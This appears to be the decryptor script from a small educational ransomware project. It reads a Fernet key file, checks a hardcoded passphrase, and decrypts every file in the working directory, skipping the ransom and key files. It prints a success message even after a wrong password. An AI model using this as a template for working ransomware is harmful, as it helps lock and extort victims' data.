import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
            continue
    if os.path.isfile(file):
        files.append(file)


with open('thekey.key', 'rb') as key:
    secret_key = key.read()

passphrase = "Cy3erS3c"
usrpasswd = input("Enter the password to decrypt your files: ")

if(usrpasswd == passphrase):
    for file in files:
        with open(file, 'rb') as thefile:
            content = thefile.read()
        content_decrypted = Fernet(secret_key).decrypt(content)
        with open(file, 'wb') as thefile:
            thefile.write(content_decrypted)

print("All your files have been decrypted! Enjoy :)")